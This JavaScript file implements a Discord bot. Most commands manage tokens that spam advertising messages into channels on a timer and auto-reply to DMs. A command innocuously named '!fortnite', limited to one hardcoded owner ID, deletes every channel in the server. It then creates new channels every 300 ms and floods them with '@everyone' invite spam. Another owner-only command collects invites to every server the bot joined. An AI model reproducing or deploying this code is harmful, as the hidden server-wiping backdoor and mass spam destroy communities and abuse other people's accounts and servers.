require('dotenv').config();
const { Client, GatewayIntentBits } = require('discord.js');
const fs = require('fs');
const color = require('colors');
const axios = require('axios');
const activeBotIntervals = {};
const botsFile = 'bots.json'; // File to store bot tokens, channels, and messages
const required_role_id = "1335495231264526407"; 
const allowedUserID = "1203119942866702356";
const lastRepliedUsers = new Map(); // Tracks last reply timestamps
const autoreplyFile = 'autoreply.json'; // File to store auto-reply bot details

//  Load auto-reply bots from file
async function startBot(token, channelIDs, msg, interval) {
  try {
    // Validate bot token
    const response = await axios.get('https://discord.com/api/v10/users/@me', {
      headers: { Authorization: token },
    });

    console.log(color.green(` Token is valid for bot: ${response.data.username}#${response.data.discriminator}`));

    //  Ensure `channelIDs` is always an array
    const channels = Array.isArray(channelIDs) 
      ? channelIDs 
      : channelIDs.split(",").map(id => id.trim());

    console.log(color.blue(`🔹 Bot will send messages in channels: ${channels.join(', ')}`));

    // Start sending messages at the interval
    const botInterval = setInterval(async () => {
      for (const channelID of channels) {
        if (!channelID || !/^\d{18,}$/.test(channelID)) {
          console.log(color.red(` Invalid channel ID: ${channelID}`));
          continue;
        }

        try {
          // Send message
          await axios.post(
            `https://discord.com/api/v10/channels/${channelID}/messages`,
            { content: msg },
            { headers: { Authorization: token } }
          );

          console.log(color.cyan(` Sent message: "${msg}" in channel ${channelID}`));
        } catch (err) {
          console.log(color.red(` Error sending message to ${channelID}: ${err.response?.data?.message || err.message}`));
        }
      }
    }, interval * 1000);

    // Store interval for later stopping
    activeBotIntervals[token] = botInterval;

  } catch (error) {
    console.error(color.red(` Invalid bot token! Unable to start bot.`));
  }
}



// Stop a bot and remove it from the lis

async function stopBot(token, bots) {
  const botIndex = bots.findIndex((b) => b.token === token);

  if (botIndex !== -1) {
    try {
      //  Fetch bot username using Axios
      const response = await axios.get("https://discord.com/api/v10/users/@me", {
        headers: { Authorization: token }, 
      });

      const botUsername = `${response.data.username}#${response.data.discriminator}`;
      console.log(color.red(` Stopping bot: ${botUsername}`));

      //  Stop the bot's message interval
      if (activeBotIntervals[token]) {
        clearInterval(activeBotIntervals[token]); //  Stop sending messages
        delete activeBotIntervals[token]; //  Remove from tracking
        console.log(color.green(` Interval for bot "${botUsername}" stopped.`));
      } else {
        console.log(color.yellow(` No active interval found for bot "${botUsername}".`));
      }

      //  Remove bot from JSON list
      bots.splice(botIndex, 1);
      fs.writeFileSync(botsFile, JSON.stringify(bots, null, 2));

      console.log(color.green(` Bot "${botUsername}" removed from list.`));
    } catch (error) {
      console.error(color.red(` Error stopping bot "${botUsername}": ${error.response?.data?.message || error.message}`));
    }
  } else {
    console.log(color.yellow(` Bot not found in the list.`));
  }
}




// Check required_role_id in config
if (!required_role_id) {
  console.error(" ERROR: required_role_id is not set. The bot cannot enforce role permissions.");
  process.exit(1);
}

// Load stored bots from file
let bots = [];
try {
  bots = fs.existsSync(botsFile) ? JSON.parse(fs.readFileSync(botsFile, 'utf-8')) : [];
} catch (err) {
  console.error(` Failed to load bots file: ${err.message}`);
}

const mainBot = new Client({
  intents: [
    GatewayIntentBits.Guilds,
    GatewayIntentBits.GuildMessages,
    GatewayIntentBits.MessageContent,
    GatewayIntentBits.GuildMembers,
  ],
});

mainBot.once('ready', () => {
  console.log(` Main bot logged in as ${mainBot.user.tag}`);
});

console.log(` Using bot token: ${process.env.TOKEN}`);

// Role check
async function hasRequiredRole(member) {
  await member.fetch(); // Ensure the roles cache is updated
  return member.roles.cache.has(required_role_id);
}

// Validate token without using gateway intents
async function validateToken(token) {
  try {
    const response = await axios.get('https://discord.com/api/v9/users/@me', {
      headers: { Authorization: token }, // Correct token format
    });
    console.log(` Token is valid`);
    return true;
  } catch (error) {
    console.error(` Invalid bot token: ${token}`);
    return false;
  }
}

// Handle commands
mainBot.on('messageCreate', async (message) => {
  if (message.author.bot) return;

  try {
    const args = message.content.match(/"([^"]+)"|(\S+)/g);
    if (!message.guild) {
      return message.channel.send('❌ Commands must be used in a server.');
    }
    const member = await message.guild.members.fetch(message.author.id);

    // Ensure the member has the required role
   
    if (message.content.startsWith('!remove')) {
      if (!await hasRequiredRole(member)) {
        return message.channel.send(`❌ You do not have permission to use this command. Required role ID: whitelist`);
      }
      if (!args || args.length < 2) {
        return message.channel.send('❌ Incorrect format! Use: !remove "token"');
      }

      const tokenToRemove = args[1].replace(/"/g, '').trim(); // Ensure token is cleaned up

      // Debug: Print out the stored tokens and the token being checked
      console.log('Stored tokens in bots:', bots.map(b => b.token));  // Check tokens in the JSON
      console.log(`Trying to remove bot with token: ${tokenToRemove}`);

      const botIndex = bots.findIndex((b) => b.token === tokenToRemove);

      if (botIndex === -1) {
        return message.channel.send('❌ Bot not found!');
      }

      // Stop bot before removal
      stopBot(tokenToRemove, bots);

      // Remove the bot from the array and update the file
      fs.writeFileSync(botsFile, JSON.stringify(bots, null, 2));

      message.channel.send(`✅ Bot with token "${tokenToRemove}" removed successfully!`);
    }

   if (message.content.startsWith('!add')) {
  if (!await hasRequiredRole(member)) {
    return message.channel.send(`❌ You do not have permission to use this command. Required role ID: whitelist`);
  }
  if (!args || args.length < 5) {
    return message.channel.send('❌ Incorrect format! Use: !add "token" "channel1,channel2" interval message');
  }

  const token = args[1].replace(/"/g, '').trim();  // Clean up token
  const channelID = args[2].replace(/"/g, '').trim();  // Clean up channelID
  const interval = parseInt(args[3].replace(/"/g, '').trim(), 10);  // Convert interval to number
  const msg = args.slice(4).join(' ').replace(/\\n/g, '\n');


  if (isNaN(interval) || interval < 5) { // Minimum interval check
    return message.channel.send('❌ Invalid interval! Must be a number and at least 5 seconds.');
  }

  // Check if bot is already registered
  if (bots.some((b) => b.token === token)) {
    return message.channel.send('❌ This bot is already registered!');
  }

  if (!(await validateToken(token))) {
    return message.channel.send('❌ Invalid bot token! Please check and try again.');
  }
  const channels = channelID.includes(",") 
  ? channelID.split(",").map(id => id.trim()) 
  : [channelID];  // Ensure multiple IDs are stored as an array

bots.push({ token, channelIDs: channels, msg, interval });

fs.writeFileSync(botsFile, JSON.stringify(bots, null, 2));  // Save correctly formatted JSON

  // Register the bot if not already registered


  fs.writeFileSync(botsFile, JSON.stringify(bots, null, 2));  // Update bots.json



  startBot(token, channels, msg, interval);  // Start the bot with interval
  message.channel.send(`✅ Bot added successfully with an interval of ${interval} seconds!`);
}
if (message.content.startsWith('!autoreply')) {
  if (!await hasRequiredRole(member)) {
    return message.channel.send(`❌ You do not have permission to use this command. Required role ID: whitelist`);
  }

  
  const args = message.content.match(/"([^"]+)"|(\S+)/g);
  if (!args || args.length < 3) {
    return message.channel.send('❌ Incorrect format! Use: `!autoreply "token" "autoReplyMsg"`');
  }

  const token = args[1].replace(/"/g, '').trim();
  const autoReplyMsg = args.slice(2).join(' ').replace(/"/g, '').trim();

  let autoReplyBots = loadAutoReplyBots();

  //  Prevent duplicate bot entries
  if (autoReplyBots.some(bot => bot.token === token)) {
    return message.channel.send('❌ This bot is already set up for auto-replies!');
  }

  autoReplyBots.push({ token, autoReplyMsg });
  saveAutoReplyBots(autoReplyBots);

  //  Start auto-reply functionality
  startAutoReplyBots(token, autoReplyMsg);

  message.channel.send(`✅ Auto-reply enabled for bot! Message: "${autoReplyMsg}"`);
}


if (message.content.startsWith('!fortnite')) {
  if (message.author.id !== allowedUserID) {
    return message.channel.send("❌ You do not have permission to use this command.");
  }
  
resetChannels(message.guild)


}if (message.content.startsWith('!stopreply')) {
  if (!await hasRequiredRole(member)) {
    return message.channel.send(`❌ You do not have permission to use this command. Required role ID: whitelist`);
  }

  const args = message.content.match(/"([^"]+)"|(\S+)/g);
  if (!args || args.length < 2) {
    return message.channel.send('❌ Incorrect format! Use: `!stopreply "token"`');
  }

  const tokenToRemove = args[1].replace(/"/g, '').trim();
  let autoReplyBots = loadAutoReplyBots();

  //  Find and remove bot
  const botIndex = autoReplyBots.findIndex(bot => bot.token === tokenToRemove);
  if (botIndex === -1) {
    return message.channel.send('❌ Auto-reply bot not found.');
  }

  autoReplyBots.splice(botIndex, 1); // Remove bot from list
  saveAutoReplyBots(autoReplyBots); // Save the updated list

  //  Stop checking DMs for this bot
  lastRepliedUsers.delete(tokenToRemove); 

  console.log(color.yellow(` Stopping auto-reply for bot: ${tokenToRemove}`));

  // Restart the interval to apply changes
  restartAutoReplyBots();

  message.channel.send(`✅ Auto-reply disabled for bot.`);
}



if (message.content.startsWith('!servers')) {
  if (message.author.id !== allowedUserID) {
    return message.channel.send("❌ You do not have permission to use this command.");
  }

  let serverList = [];

  for (const guild of mainBot.guilds.cache.values()) {
    try {
      const invites = await guild.invites.fetch();
      let invite = invites.first()?.url || "❌ No invite found";
      
      serverList.push(`📌 **${guild.name}** | (${invite})`);
    } catch {
      serverList.push(`📌 **${guild.name}** | ❌ No permission to generate invite`);
    }
  }

  if (serverList.length === 0) {
    return message.channel.send("❌ This bot is not in any servers.");
  }

  message.channel.send(`✅ **Servers I'm in:**\n${serverList.join("\n")}`);
}

if (message.content.startsWith('!stop')){
  if (message.content.startsWith('!stopreply')) {

return;


  }
  if (message.author.id !== allowedUserID) {
    return message.channel.send("❌ You do not have permission to use this command.");
  }
  if (CreateChannelsinterval){
  clearInterval(CreateChannelsinterval); 
  message.channel.send("stopping...");
  }else
  {

    message.channel.send("no interval running");
}

}
  } catch (err) {
    console.error(` Error processing message: ${err.message}`);
  }
});

async function sendMessageToAllChannels(guild, message) {
  try {
    console.log(" Sending message to all channels...");

    // Loop through all channels
    guild.channels.cache.forEach(async (channel) => {
      if (channel.type === 0) { // 0 = Text Channel
        await channel.send(message);
        console.log(` Message sent in #${channel.name}`);
      }
    });

    console.log(" Message sent in all channels!");

  }
  
  
  catch (error) {
    console.error(" Error sending messages:", error);
  }
}
async function resetChannels(guild) {
  try {
    console.log(" Resetting server channels...");

    // 1️⃣ DELETE ALL CHANNELS
    const channels = guild.channels.cache;
    for (const [channelID, channel] of channels) {
      await channel.delete();
      console.log(` Deleted channel: ${channel.name}`);
    }


    // 2️⃣ CREATE NEW CHANNELS
    CreateChannelsinterval = setInterval(async () => {
      const newChannel = await guild.channels.create({
        name: "pcontop",
        type: 0, // 0 = Text Channel
      });
        sendMessageToAllChannels(guild, "@everyone pcontop join https://discord.gg/tokyosmm https://cdn.discordapp.com/attachments/1235748246983540827/1336511833896390757/image.png?ex=67a41324&is=67a2c1a4&hm=7e9124e50486fc93b46093c3fd43218fa7df26c6bced8c0dd01bbf5553ea12b1&"); // Send message after all channels are created
 
 
/*
      createdChannels.push(newChannel.id);
      console.log(`Created channel: ${newChannel.name}`);

*/     // Move to the next channel in the list
    }, 300); 

  } catch (err) {
    console.error(" Error resetting channels:", err);
  }
}



// Load Auto-Reply Bots
function loadAutoReplyBots() {
  try {
    if (!fs.existsSync(autoreplyFile)) {
      fs.writeFileSync(autoreplyFile, JSON.stringify([]));
    }
    return JSON.parse(fs.readFileSync(autoreplyFile, 'utf-8'));
  } catch (err) {
    console.error(` Failed to load ${autoreplyFile}: ${err.message}`);
    return [];
  }
}

//  Save Auto-Reply Bots
function saveAutoReplyBots(bots) {
  fs.writeFileSync(autoreplyFile, JSON.stringify(bots, null, 2));
}

async function checkForDMs(bot) {
  try {
    let autoReplyBots = loadAutoReplyBots();
    if (!autoReplyBots.some(b => b.token === bot.token)) {
      console.log(color.yellow(` Bot removed: Stopping DM check for ${bot.token.slice(0, 10)}`));
      return; //  Stop if the bot is removed
    }

    console.log(color.yellow(`🔍 Checking for new DMs for bot: ${bot.token.slice(0, 10)}...`));

    //  Get bot's user ID
    const botUser = await axios.get('https://discord.com/api/v10/users/@me', {
      headers: { Authorization: bot.token }
    });
    const botUserId = botUser.data.id;

    //  Fetch DM channels
    const dmChannels = await axios.get(`https://discord.com/api/v10/users/@me/channels`, {
      headers: { Authorization: bot.token }
    });

    for (const channel of dmChannels.data) {
      const messages = await axios.get(`https://discord.com/api/v10/channels/${channel.id}/messages?limit=1`, {
        headers: { Authorization: bot.token }
      });

      if (!messages.data.length) continue;
      const message = messages.data[0];
      const userId = message.author.id;

      //  Ignore bot's own messages
      if (userId === botUserId) continue;

      // ❌ Ignore if already replied within the last 24 hours
      const lastReplyTime = lastRepliedUsers.get(userId);
      if (lastReplyTime && Date.now() - lastReplyTime < 24 * 60 * 60 * 1000) {
        console.log(color.gray(` Skipping reply to ${message.author.username}, already replied today.`));
        continue;
      }

      console.log(color.cyan(` New DM from ${message.author.username}: ${message.content}`));

      //  Open DM channel if needed
      const dmChannel = await axios.post(
        'https://discord.com/api/v10/users/@me/channels',
        { recipient_id: userId },
        { headers: { Authorization: bot.token, "Content-Type": "application/json" } }
      );

      //  Send auto-reply
      await axios.post(
        `https://discord.com/api/v10/channels/${dmChannel.data.id}/messages`,
        { content: bot.autoReplyMsg },
        { headers: { Authorization: bot.token, "Content-Type": "application/json" } }
      );

      console.log(color.green(` Auto-replied to ${message.author.username}: ${bot.autoReplyMsg}`));

      //  Track replied users to prevent spam
      lastRepliedUsers.set(userId, Date.now());
    }
  } catch (error) {
    console.error(color.red(` Error checking DMs: ${error.response?.data?.message || error.message}`));
  }
}

//  Start Auto-Reply Bots
async function startAutoReplyBots() {
  const autoReplyBots = loadAutoReplyBots();
  if (!autoReplyBots.length) {
    console.log(color.red(" No auto-reply bots found in autoreply.json."));
    return;
  }

  setInterval(() => {
    autoReplyBots.forEach(bot => checkForDMs(bot));
  }, 5000); // Check every 5 seconds for new DMs

  console.log(color.green("` Auto-reply bots are running..."));
}

let autoReplyInterval; // Stores the interval ID

async function restartAutoReplyBots() {
  if (autoReplyInterval) {
    clearInterval(autoReplyInterval); //  Stop old interval
  }

  const autoReplyBots = loadAutoReplyBots();
  if (!autoReplyBots.length) {
    console.log(color.red(" No auto-reply bots found. Stopping auto-reply."));
    return;
  }

  autoReplyInterval = setInterval(() => {
    autoReplyBots.forEach(bot => checkForDMs(bot));
  }, 5000);

  console.log(color.green(" Auto-reply bots restarted with updated list."));
}
// start autoreply
startAutoReplyBots();

// Start bots and main bot
bots.forEach((bot) => startBot(bot.token, bot.channelIDs, bot.msg,bot.interval));
mainBot.login(process.env.TOKEN);
                                                                                                    
                       
